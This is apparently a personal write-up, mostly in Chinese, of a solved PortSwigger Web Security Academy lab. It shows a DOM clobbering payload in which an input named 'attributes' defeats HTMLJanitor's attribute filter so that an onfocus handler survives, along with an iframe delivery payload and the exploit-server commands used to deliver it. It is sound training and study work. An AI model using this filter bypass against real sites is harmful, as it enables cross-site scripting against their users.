---
title: "lab-dom-clobbering-attributes-to-bypass-html-filters"
links:
  - target: dom-xss-family
    relation: evidences
---

# lab-dom-clobbering-attributes-to-bypass-html-filters

> evidences: [[dom-xss-family]]

- 题面:Clobbering DOM attributes to bypass HTML filters(/web-security/dom-based/dom-clobbering/lab-dom-clobbering-attributes-to-bypass-html-filters)
- 实例:https://0a5600c103490a3d808fcb11007200a4.web-security-academy.net
- 利用服务器:https://exploit-0a4c006803c90ad38022cafe01f4003b.exploit-server.net
- slug(真):请求 slug `…/dom-clobbering/lab-dom-clobbering-attribute-injection-to-enable-html-injection` **404**;
  经 widget 解析得真 slug 与 lab_id(见下)。
- 判定目标:绕过 HTMLJanitor 注入向量,使受害者浏览器 `print()`;状态:**solved**(交付后 solved_check true)

## 关键步

1. 评论区用 `htmlJanitor.js` 过滤,配置 `{tags:{input:{name,type,value},form:{id},i,b,p}}`;
   `_sanitize` 靠 `for (var a=0;a<node.attributes.length;a+=1)` 逐属性删不允许项。
2. clobber:评论体 `<form id=x tabindex=0 onfocus=print()><input name=attributes>`。
   子控件 `name=attributes` 经 HTMLFormElement 的 named getter **覆盖 `form.attributes`** → `node.attributes.length`
   为 undefined → 属性过滤循环整段跳过 → `onfocus` 存活。
3. 触发:评论经 XHR 异步载入,若初次加载就带 `#x` 片段,聚焦时元素尚未存在;须**评论渲染后再导航片段**。
   投递 payload:`<iframe id=f src="https://<inst>/post?postId=1" onload="setTimeout(()=>f.src='https://<inst>/post?postId=1#x',3000)"></iframe>`
   (片段导航聚焦 tabindex=0 的 form → onfocus → print)。

## widget 解析

```
POST https://portswigger.net/api/widgets  Widget-Source: /web-security/dom-based
 body [{"widgetId":"academy-labstatus","additionalData":{"widget-lab-id":"4D27A0EBB9FA4E9A66754F25EBBACA6772F085E601B714356DC4437A47E3EFDC"}}, …]
 -> <a href="/web-security/dom-based/dom-clobbering/lab-dom-clobbering-attributes-to-bypass-html-filters">Clobbering DOM attributes to bypass HTML filters</a>
lab_id = 4D27A0EBB9FA4E9A66754F25EBBACA6772F085E601B714356DC4437A47E3EFDC
```

## 证据摘录

```
# 先 POST /post/comment 存评论体(需 /post?postId=1 的 csrf)
lab_alert "<inst>/post?postId=1" --settle-ms 4000 --driver "window.print=function(){window.__labAlerts.push('print')};var t=setInterval(function(){var e=document.getElementById('x');if(e){e.focus();clearInterval(t);}},200)"
 -> {"alerts":["print"],"fired":true}          # 本地:clobber 生效 + print 触发
# 交付(iframe + 延时片段 --follow);exploit log 见 (Victim) Chrome
solved_check "<inst>/" --jar /tmp/b15-jar5.json
 -> {"solved":true,"congrats_line":"<h4>Congratulations, you solved the lab!</h4>"}
```

## 复现命令

```
lab_launch launch 4D27A0EBB9FA4E9A66754F25EBBACA6772F085E601B714356DC4437A47E3EFDC --widget-source /web-security/dom-based/dom-clobbering --jar /tmp/b15-jar5.json
# POST /post/comment: comment=<form id=x tabindex=0 onfocus=print()><input name=attributes>
lab_http post "https://<exploit>/" --form urlIsHttps=on --form responseFile=/exploit --form 'responseHead=HTTP/1.1 200 OK\nContent-Type: text/html' --form 'responseBody=<iframe id=f src="https://<inst>/post?postId=1" onload="setTimeout(function(){f.src=&#39;https://<inst>/post?postId=1#x&#39;},3000)"></iframe>' --form formAction=DELIVER_TO_VICTIM --follow
solved_check "<inst>/" --jar /tmp/b15-jar5.json
```
